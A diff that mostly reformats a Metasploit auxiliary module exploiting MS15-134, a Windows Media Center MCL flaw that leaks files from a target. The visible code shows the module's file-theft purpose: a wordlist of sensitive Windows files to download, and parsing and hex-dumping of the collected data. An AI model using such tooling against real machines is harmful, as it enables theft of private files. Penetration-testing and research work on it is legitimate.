@@ -11,38 +11,45 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'MS15-134 Microsoft Windows Media Center MCL Information Disclosure',
-      'Description'    => %q{
-        This module exploits a vulnerability found in Windows Media Center. It allows an MCL
-        file to render itself as an HTML document in the local machine zone by Internet Explorer,
-        which can be used to leak files on the target machine.
+    super(
+      update_info(
+        info,
+        'Name' => 'MS15-134 Microsoft Windows Media Center MCL Information Disclosure',
+        'Description' => %q{
+          This module exploits a vulnerability found in Windows Media Center. It allows an MCL
+          file to render itself as an HTML document in the local machine zone by Internet Explorer,
+          which can be used to leak files on the target machine.
 
-        Please be aware that if this exploit is used against a patched Windows, it can cause the
-        computer to be very slow or unresponsive (100% CPU). It seems to be related to how the
-        exploit uses the URL attribute in order to render itself as an HTML file.
-      },
-      'Author'         =>
-        [
+          Please be aware that if this exploit is used against a patched Windows, it can cause the
+          computer to be very slow or unresponsive (100% CPU). It seems to be related to how the
+          exploit uses the URL attribute in order to render itself as an HTML file.
+        },
+        'Author' => [
           'Francisco Falcon', # Vuln discovery & PoCs & Detailed write-ups & awesomeness
           'sinn3r'
         ],
-      'References'     =>
-        [
+        'References' => [
           ['CVE', '2015-6127'],
           ['MSB', 'MS15-134'],
           ['URL', 'https://blog.coresecurity.com/2015/12/09/exploiting-windows-media-center/'],
           ['URL', 'http://www.coresecurity.com/advisories/microsoft-windows-media-center-link-file-incorrectly-resolved-reference']
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2015-12-08',
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2015-12-08',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('FILENAME', [true, 'The MCL file', 'msf.mcl']),
-        OptPath.new('FILES',      [true, 'Files you wish to download', ::File.join(Msf::Config.data_directory, 'wordlists', 'sensitive_files_win.txt')])
-      ])
+        OptPath.new('FILES', [true, 'Files you wish to download', ::File.join(Msf::Config.data_directory, 'wordlists', 'sensitive_files_win.txt')])
+      ]
+    )
   end
 
   def receiver_page
@@ -138,7 +145,7 @@ for (var i=0; i < files.length; i++) {
 
     {
       fname: ::File.basename(params['fname'].first),
-      data:  parse_data(params['data'].first)
+      data: parse_data(params['data'].first)
     }
   end
 
@@ -166,6 +173,5 @@ for (var i=0; i < files.length; i++) {
     # here you go (handy for debugging purposes, but against a larger network this is probably
     # too much info)
     vprint_status("File collected: #{file[:fname]}\n\n#{Rex::Text.to_hex_dump(file[:data])}")
-
   end
 end
